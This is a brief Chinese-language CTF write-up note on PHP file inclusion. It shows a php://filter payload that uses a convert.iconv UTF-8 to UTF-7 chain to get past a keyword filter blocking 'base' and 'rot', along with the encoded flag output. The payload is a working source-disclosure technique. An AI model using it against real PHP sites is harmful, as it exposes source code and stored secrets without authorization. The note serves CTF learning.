
https://www.novel.tools/decode/UTF-7

![[Pasted image 20231020233426.png]]

> `php://filter` 是一种元封装器，设计用于数据流打开时的筛选过滤应用。这对于一体式（all-in-one）的文件函数非常有用，类似 `readfile()`、 `file()` 和 `file_get_contents()`，在数据流内容读取之前没有机会应用其他过滤器。 `php://filter` 目标使用以下的参数作为它路径的一部分。复合过滤链能够在一个路径上指定。详细使用这些参数可以参考具体范例。

![[Pasted image 20231020234655.png]]
GET传递的file中不包含base或rot才可以执行文件包含

可以使用
##### [convert.iconv](https://tyskill.github.io/posts/php_filter_%E8%BF%87%E6%BB%A4%E5%99%A8/#contents:converticonv)

字符串按要求的字符编码来转换

使用格式：`convert.iconv.当前编码.目标编码`

支持的[编码方式](https://www.php.net/manual/en/mbstring.supported-encodings.php)

payload: ?file=php://filter/convert.iconv.UTF-8.UTF-7/resource=flag.php

```shell
+ADw?php //flag+AHs-b6bdc755-66c1-4a42-b3f0-adc7dcd558cc+AH0
UTF-7 encode to UTF-8 即可得到flag
```